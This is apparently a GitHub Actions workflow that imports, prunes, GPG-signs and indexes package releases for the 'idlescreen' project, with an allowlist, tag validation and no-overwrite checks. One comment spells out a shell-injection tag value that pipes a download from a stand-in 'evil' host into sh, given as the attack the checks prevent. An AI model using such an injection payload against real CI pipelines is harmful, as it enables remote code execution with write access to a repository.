name: Import Product Release

on:
  repository_dispatch:
    types:
      - new_release
  # Catch-up path: repository_dispatch only holds one pending run, so a
  # dispatch arriving while another is queued is dropped silently. The
  # sweep below converges the pool to every product repo's latest release
  # regardless of which trigger fired — a dropped dispatch self-heals here.
  workflow_dispatch:
  schedule:
    - cron: '17 */6 * * *'

permissions:
  contents: write

# Serialise imports: parallel dispatches regenerate the same pool metadata
# and the rebase in the last step conflicts. Queuing is correct — each run
# imports its own release artifacts.
concurrency:
  group: import-release
  cancel-in-progress: false

# Allowed source repos for the import trigger. Anything outside this list is
# rejected at the first step so a compromised PAT cannot push arbitrary
# release payloads into our pool.
env:
  ALLOWED_REPOS: ${{ vars.IDLESCREEN_IMPORT_REPOS || 'idlescreen/runtime,idlescreen/cosmic,idlescreen/tui,idlescreen/studio,idlescreen/packages,idlescreen/savers,idlescreen/cli,idlescreen/idlescreen' }}

jobs:
  import:
    name: 'Import & Index Release'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout packages repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1

      - name: Reject unexpected source repo
        if: github.event_name == 'repository_dispatch'
        env:
          DISPATCH_REPO: ${{ github.event.client_payload.repo }}
          DISPATCH_TAG: ${{ github.event.client_payload.tag }}
        run: |
          # client_payload arrives via env, never expression interpolation
          # into shell: a crafted tag like `"; curl evil|sh; #"` would
          # otherwise execute in this contents:write job.
          case ",${ALLOWED_REPOS}," in
            *",${DISPATCH_REPO},"*) echo "source repo: ${DISPATCH_REPO} (allowed)" ;;
            *) echo "ERROR: dispatch from untrusted repo '${DISPATCH_REPO}' (allowed: ${ALLOWED_REPOS})" >&2; exit 1 ;;
          esac
          # Tag shape: release tags are v<semver>; bound length + charset so a
          # hostile dispatch payload cannot smuggle metacharacters downstream.
          case "${DISPATCH_TAG}" in
            ""|*[!A-Za-z0-9._-]*) echo "ERROR: invalid tag '${DISPATCH_TAG}'" >&2; exit 1 ;;
          esac
          if [ "${#DISPATCH_TAG}" -gt 64 ]; then
            echo "ERROR: tag too long (${#DISPATCH_TAG} > 64)" >&2; exit 1
          fi

      - name: Install Rust
        run: |
          rustup update stable
          rustup default stable

      - name: Install indexing and signing dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y dpkg-dev apt-utils createrepo-c rpm gpg

      - name: Download release assets (no clobber)
        if: github.event_name == 'repository_dispatch'
        env:
          GH_TOKEN: ${{ github.token }}
          DISPATCH_REPO: ${{ github.event.client_payload.repo }}
          DISPATCH_TAG: ${{ github.event.client_payload.tag }}
        run: |
          set -e
          # Refuse to clobber an existing pool file: download to a staging
          # dir first, compare basenames against the pool, then copy in.
          # Either the dispatch is a legitimate new release (no overlap) or
          # the operator must intervene. This closes the silent-overwrite hole.
          # Staging lives outside the repo: the commit step's
          # reset --hard retry path re-copies from here — copies inside
          # the repo would be deleted by the reset once committed.
          _staging="${RUNNER_TEMP}/import-staging"
          mkdir -p "$_staging/deb" "$_staging/rpm"

          gh release download "${DISPATCH_TAG}" \
            --repo "${DISPATCH_REPO}" \
            --pattern "*.deb" \
            --dir "$_staging/deb" || true

          gh release download "${DISPATCH_TAG}" \
            --repo "${DISPATCH_REPO}" \
            --pattern "*.rpm" \
            --dir "$_staging/rpm" || true

          _guard() {
            for f in "$1"/*; do
              [ -e "$f" ] || continue
              if [ -e "$2/$(basename "$f")" ]; then
                echo "ERROR: pool already has $(basename "$f"); refusing clobber" >&2
                exit 1
              fi
            done
          }
          _guard "$_staging/deb" apt/pool/main
          _guard "$_staging/rpm" rpm/pool
          cp "$_staging/deb"/*.deb apt/pool/main/ 2>/dev/null || true
          cp "$_staging/rpm"/*.rpm rpm/pool/ 2>/dev/null || true

      - name: Sweep latest releases for missing pool files
        env:
          GH_TOKEN: ${{ github.token }}
          ALLOWED_REPOS: ${{ env.ALLOWED_REPOS }}
        run: |
          set -e
          # Heal dropped dispatches: for every allowed product repo, compare
          # its latest release's .deb/.rpm asset names against the pool and
          # pull whatever is absent. Basenames already in the pool or in the
          # dispatch staging dir are skipped — the sweep never clobbers.
          _staging="${RUNNER_TEMP}/import-staging"
          mkdir -p "$_staging/deb" "$_staging/rpm" "$_staging/dl"
          _repos="$(echo "${ALLOWED_REPOS}" | tr ',' ' ')"

          for repo in ${_repos}; do
            _tag=$(gh release view --repo "${repo}" --json tagName -q .tagName 2>/dev/null) || continue
            [ -n "${_tag}" ] || continue
            _names=$(gh release view --repo "${repo}" --json assets -q '.assets[].name')
            for name in ${_names}; do
              case "${name}" in
                *.deb) _dst=apt/pool/main ; _sub=deb ;;
                *.rpm) _dst=rpm/pool ; _sub=rpm ;;
                *) continue ;;
              esac
              if [ -e "${_dst}/${name}" ] || [ -e "${_staging}/${_sub}/${name}" ]; then
                continue
              fi
              echo "sweep: ${repo} ${_tag} missing ${name} — importing"
              if gh release download "${_tag}" --repo "${repo}" \
                  --pattern "${name}" --dir "${_staging}/dl"; then
                mv "${_staging}/dl/${name}" "${_staging}/${_sub}/${name}"
                cp "${_staging}/${_sub}/${name}" "${_dst}/"
              else
                echo "WARNING: sweep download failed for ${repo} ${_tag} ${name}" >&2
              fi
            done
          done

      - name: Prune old versions from pool
        run: |
          # Keep the latest 3 versions of each package to prevent bloat.
          # The prune binary is local to this repo and only acts on the pool
          # directories; dispatch payloads cannot supply alternate paths.
          cargo run --release --bin prune

      - name: Require GPG private key
        env:
          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
        run: |
          if [ -z "$GPG_PRIVATE_KEY" ]; then
            echo "ERROR: secret GPG_PRIVATE_KEY is required (refuse unsigned publish)"
            exit 1
          fi

      - name: Import GPG private key
        env:
          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
        run: |
          # Set up GPG agent to allow loopback pinentry
          mkdir -p ~/.gnupg
          echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
          echo "pinentry-mode loopback" >> ~/.gnupg/gpg.conf
          chmod 700 ~/.gnupg
          gpgconf --kill gpg-agent

          # Create passphrase file and wrapper script if passphrase is set
          if [ -n "$GPG_PASSPHRASE" ]; then
            echo "$GPG_PASSPHRASE" > /tmp/gpg-passphrase.txt
            chmod 600 /tmp/gpg-passphrase.txt
            echo '#!/bin/bash' > /tmp/gpg-wrapper
            echo 'exec gpg --pinentry-mode loopback --passphrase-file /tmp/gpg-passphrase.txt "$@"' >> /tmp/gpg-wrapper
            chmod +x /tmp/gpg-wrapper
            echo "$GPG_PRIVATE_KEY" | /tmp/gpg-wrapper --batch --yes --import
          else
            echo "$GPG_PRIVATE_KEY" | gpg --batch --yes --import
          fi

      - name: Sign packages and rebuild metadata indexes
        env:
          IDLESCREEN_GPG_NAME: ${{ secrets.IDLESCREEN_GPG_NAME }}
          CRATERIA_GPG_NAME: ${{ secrets.CRATERIA_GPG_NAME }}
          IDLESCREEN_SKIP_RPM_SIGN_INSTALL: "true"
          CRATERIA_SKIP_RPM_SIGN_INSTALL: "true"
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
        run: |
          # Prefer IDLESCREEN_GPG_NAME; fall back to CRATERIA_GPG_NAME / default identity
          export IDLESCREEN_GPG_NAME="${IDLESCREEN_GPG_NAME:-${CRATERIA_GPG_NAME:-jerydleuck@gmail.com}}"
          export CRATERIA_GPG_NAME="$IDLESCREEN_GPG_NAME"
          if [ -n "$GPG_PASSPHRASE" ]; then
            export IDLESCREEN_GPG_BIN="/tmp/gpg-wrapper"
            export CRATERIA_GPG_BIN="/tmp/gpg-wrapper"
          fi
          # Sign RPM payloads + rebuild APT/RPM indexes (see docs/SIGNING.md)
          if [ -n "$GPG_PASSPHRASE" ]; then IDLESCREEN_GPG_BIN=/tmp/gpg-wrapper CRATERIA_GPG_BIN=/tmp/gpg-wrapper cargo run --release --bin sign; else cargo run --release --bin sign; fi
          rm -f /tmp/gpg-passphrase.txt /tmp/gpg-wrapper
          # Fail if any RPM lacks a signature from our key. ubuntu's rpm 4.18
          # cannot cryptographically verify Ed25519 header signatures (needs
          # rpm >= 4.20), so assert the signature packet carries our key ID;
          # clients verify fully at install via the pinned repo key.
          for f in rpm/pool/*.rpm; do
            rpm -Kv "$f" 2>/dev/null \
              | grep -qiE 'c0243160|c7817dd2|3d2d670dbd9bd94d7b2d23d356ed99e8c0243160|549e73c9bc9229c786e538e2fbd8fc52c7817dd2' \
              || { echo "UNSIGNED or wrong key: $f"; rpm -Kv "$f"; exit 1; }
          done

      - name: Commit and push changes
        env:
          DISPATCH_REPO: ${{ github.event.client_payload.repo }}
          DISPATCH_TAG: ${{ github.event.client_payload.tag }}
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
          IDLESCREEN_GPG_NAME: ${{ secrets.IDLESCREEN_GPG_NAME }}
          CRATERIA_GPG_NAME: ${{ secrets.CRATERIA_GPG_NAME }}
          IDLESCREEN_SKIP_RPM_SIGN_INSTALL: "true"
          CRATERIA_SKIP_RPM_SIGN_INSTALL: "true"
        run: |
          git config --global user.name "github-actions[bot]"
          git config --global user.email "41898282+github-actions[bot]@users.noreply.github.com"
          if [ -n "${DISPATCH_REPO}" ]; then
            _msg="Import ${DISPATCH_REPO} ${DISPATCH_TAG}"
          else
            _msg="Pool sweep: catch-up import"
          fi
          git add -A
          git diff-index --quiet HEAD || git commit -m "${_msg}"

          # Bounded retry: when a concurrent import pushed first, reset to
          # origin and regenerate over the merged pool. The first commit
          # made the pool files tracked, so reset --hard deletes them —
          # re-copy from the staging dir outside the repo (skipping any
          # basename the winning import already placed, preserving the
          # no-clobber rule). The metadata is deterministic, so this
          # converges instead of failing.
          for _attempt in 1 2 3; do
            if git push; then
              exit 0
            fi
            git fetch origin
            git reset --hard origin/master
            for f in "${RUNNER_TEMP}/import-staging/deb"/*.deb; do
              [ -e "$f" ] || continue
              [ -e "apt/pool/main/$(basename "$f")" ] || cp "$f" apt/pool/main/
            done
            for f in "${RUNNER_TEMP}/import-staging/rpm"/*.rpm; do
              [ -e "$f" ] || continue
              [ -e "rpm/pool/$(basename "$f")" ] || cp "$f" rpm/pool/
            done
            # The newer remote may itself have pushed a package past the
            # keep-3 limit — re-prune over the merged pool state.
            cargo run --release --bin prune
            # Same identity fallback as the sign step — the IDLESCREEN/CRATERIA
            # GPG_NAME secrets may be unset; the retry must not die on it.
            export IDLESCREEN_GPG_NAME="${IDLESCREEN_GPG_NAME:-${CRATERIA_GPG_NAME:-jerydleuck@gmail.com}}"
            export CRATERIA_GPG_NAME="$IDLESCREEN_GPG_NAME"
            # /tmp/gpg-wrapper was removed by the sign step — recreate it so a
            # passphrase-protected key still signs non-interactively on retry.
            if [ -n "$GPG_PASSPHRASE" ]; then
              echo "$GPG_PASSPHRASE" > /tmp/gpg-passphrase.txt
              chmod 600 /tmp/gpg-passphrase.txt
              printf '#!/bin/bash\nexec gpg --pinentry-mode loopback --passphrase-file /tmp/gpg-passphrase.txt "$@"\n' > /tmp/gpg-wrapper
              chmod +x /tmp/gpg-wrapper
              IDLESCREEN_GPG_BIN=/tmp/gpg-wrapper CRATERIA_GPG_BIN=/tmp/gpg-wrapper cargo run --release --bin sign
            else
              cargo run --release --bin sign
            fi
            git add -A
            git commit -m "${_msg} (merged)" || true
          done
          echo "ERROR: push failed after 3 attempts" >&2
          exit 1
